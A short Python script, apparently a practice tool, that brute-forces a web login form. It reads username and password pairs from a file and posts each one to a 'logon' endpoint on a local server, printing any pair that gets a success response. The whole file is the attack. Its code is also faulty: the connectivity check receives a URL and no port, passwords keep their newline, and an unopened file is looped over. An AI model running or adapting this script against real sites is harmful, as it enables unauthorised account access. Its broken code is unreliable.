import requests
import sys
import time
import socket


def test_network_connectivity(host, port):
    try:
        # Create a socket object
        sock = socket.create_connection((host, port), timeout=5)
        print(f"Successfully connected to {host}:{port}")
        sock.close()
        return True
    except socket.error as e:
        print(f"Unable to connect to {host}:{port}. Error: {e}")
        return False
    
#define URL here
#in the form of 'youtube.com'
url = '127.0.0.1:5000'
path = 'logon'
#example
url = f'https://{url}/{path}'

if not test_network_connectivity(url, None):
    print('\n\nTerminating Program...\n\n')
    exit (1)

#add items to brute force
lst = []
f = None
# if a file is being defined
if len(lst) == 0 and len(sys.argv) == 1:
    try: 
        fileName = input('Enter file name')
        f = open(fileName, 'r')    
    except FileNotFoundError:
        print("File not found.")
elif len(sys.argv) == 2:
    try:
        f = open(sys.argv[1], 'r')
    except FileNotFoundError:
        print("File not found.")

# read in teh file and add it into the lst variable 
for idx in f: 
    lst.append(idx)

for idx in lst:
    userPass = idx.split(' ')
    username = userPass[0]
    password = userPass[1]
    data = {'username': username, 'password': password}
    response = requests.post(url=url, data=data)
    # 200 is sucessful logon
    if response.status_code == 200:
        # Print the response content
        print(username, password)
    else:
        print(f"Request failed with status code: {response.status_code}")
    time.sleep(5)



